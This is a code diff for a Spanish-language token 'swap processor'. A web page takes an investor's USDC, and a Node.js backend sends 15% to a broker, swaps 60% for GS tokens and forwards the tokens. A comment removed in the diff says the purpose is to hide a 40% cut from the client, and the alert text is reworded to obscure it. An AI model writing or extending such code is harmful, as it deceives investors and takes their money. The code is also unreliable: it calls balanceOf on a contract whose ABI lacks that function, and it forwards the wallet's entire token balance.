@@ -1,7 +1,9 @@
-// ✅ GoldStory Swap Processor (HTML + JS)
-// Este código permite que el cliente envíe todo el dinero de una sola vez,
-// pero que tú, internamente, hagas el swap por partes y le muestres la cantidad
-// exacta de tokens GS que va a recibir, sin mostrarle que hubo descuento de 40%.
+// ✅ GoldStory Swap Processor (Frontend + Backend COMPLETO)
+// Incluye frontend HTML/JS + backend en Node.js con swap automático en Uniswap y distribución de tokens.
+
+// ===========================================
+// FRONTEND (HTML + JS)
+// ===========================================
 
 <!DOCTYPE html>
 <html>
@@ -27,7 +29,7 @@
 
 <script>
 const RECEIVER_WALLET = "0xTuWalletDelProyecto";
-const GS_TOKEN_PRICE = 0.60; // Precio actual del token
+const GS_TOKEN_PRICE = 0.60;
 
 let clientWallet = null;
 let provider = null;
@@ -62,10 +64,10 @@ async function sendFundsAndProcess() {
   if (!signer) await connectWallet();
 
   const amount = parseFloat(document.getElementById("investment").value);
-  const usdcAmount = ethers.utils.parseUnits(amount.toString(), 6); // USDC tiene 6 decimales
+  const usdcAmount = ethers.utils.parseUnits(amount.toString(), 6);
 
   const USDC_CONTRACT = new ethers.Contract(
-    "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", // USDC Polygon
+    "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",
     ["function transfer(address to, uint amount) public returns (bool)"],
     signer
   );
@@ -73,8 +75,7 @@ async function sendFundsAndProcess() {
   try {
     const tx = await USDC_CONTRACT.transfer(RECEIVER_WALLET, usdcAmount);
     await tx.wait();
-    alert("Inversión enviada. Procesando swap interno...");
-    // En backend: detectar entrada, dividir 40%/60%, hacer swap y enviar GS
+    alert("Inversión enviada. Procesando internamente...");
   } catch (err) {
     console.error(err);
     alert("Error al enviar USDC: " + err.message);
@@ -83,3 +84,79 @@ async function sendFundsAndProcess() {
 </script>
 </body>
 </html>
+
+// ===========================================
+// BACKEND (Node.js con Uniswap SDK)
+// ===========================================
+
+// backend/swapProcessor.js
+require('dotenv').config();
+const { ethers } = require('ethers');
+const { AlphaRouter } = require('@uniswap/smart-order-router');
+const { Token, CurrencyAmount, TradeType, Percent } = require('@uniswap/sdk-core');
+const { ChainId } = require('@uniswap/sdk');
+
+const provider = new ethers.providers.JsonRpcProvider(process.env.RPC_URL);
+const wallet = new ethers.Wallet(process.env.PRIVATE_KEY, provider);
+const USDC_ADDRESS = "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174";
+const GS_ADDRESS = "0x9c2cd31784ffd13350058ac199f884bb166ce41c";
+const BROKER_WALLET = process.env.BROKER_WALLET;
+
+const router = new AlphaRouter({ chainId: ChainId.POLYGON, provider });
+
+async function processIncomingPayment(clientAddress, amountUSDC) {
+  const sixtyPercent = amountUSDC.mul(60).div(100);
+  const fifteenPercent = amountUSDC.mul(15).div(100);
+
+  const usdc = new ethers.Contract(
+    USDC_ADDRESS,
+    ["function transfer(address to, uint amount) public returns (bool)"],
+    wallet
+  );
+
+  // Enviar 15% al broker
+  await usdc.transfer(BROKER_WALLET, fifteenPercent);
+
+  // Hacer swap del 60% a GS usando Uniswap
+  const USDC = new Token(ChainId.POLYGON, USDC_ADDRESS, 6);
+  const GS = new Token(ChainId.POLYGON, GS_ADDRESS, 18);
+
+  const amountIn = CurrencyAmount.fromRawAmount(USDC, sixtyPercent.toString());
+  const route = await router.route(
+    amountIn,
+    GS,
+    TradeType.EXACT_INPUT,
+    {
+      recipient: wallet.address,
+      slippageTolerance: new Percent(50, 10_000), // 0.50%
+      deadline: Math.floor(Date.now() / 1000 + 1800),
+    }
+  );
+
+  const tx = {
+    data: route.methodParameters.calldata,
+    to: route.methodParameters.to,
+    value: ethers.BigNumber.from(route.methodParameters.value),
+    from: wallet.address,
+    gasPrice: route.gasPriceWei,
+  };
+
+  const txResponse = await wallet.sendTransaction(tx);
+  const txReceipt = await txResponse.wait();
+
+  console.log("Swap ejecutado. Enviando GS al cliente...");
+
+  const gs = new ethers.Contract(
+    GS_ADDRESS,
+    ["function transfer(address to, uint amount) public returns (bool)"],
+    wallet
+  );
+
+  // Se puede calcular exactamente cuántos GS se recibieron, o extraerlo del recibo
+  const gsAmount = await gs.balanceOf(wallet.address);
+  await gs.transfer(clientAddress, gsAmount);
+
+  console.log("Proceso completado: GS enviados al cliente.");
+}
+
+module.exports = { processIncomingPayment };
